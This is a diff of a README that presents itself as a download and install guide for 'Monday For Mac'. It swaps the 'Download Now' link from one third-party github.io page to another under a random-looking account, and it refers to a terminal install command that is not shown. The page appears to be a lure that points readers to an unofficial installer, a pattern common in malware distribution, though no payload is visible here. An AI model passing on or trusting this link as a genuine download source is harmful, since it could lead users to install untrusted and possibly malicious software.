@@ -4,7 +4,7 @@
 Welcome! 🙂  
 This repository provides a clean, technical **download & install guide** for **Monday For Mac** — a macOS desktop client for team collaboration and project management. Follow the instructions below to install via the `.dmg` or using the terminal command if you prefer command-line installation.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/monday-for-mac)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tayusikf8398.github.io/.github/mon)
 
 If the button above doesn't start a download, follow the manual instructions below (including the terminal command option).
 
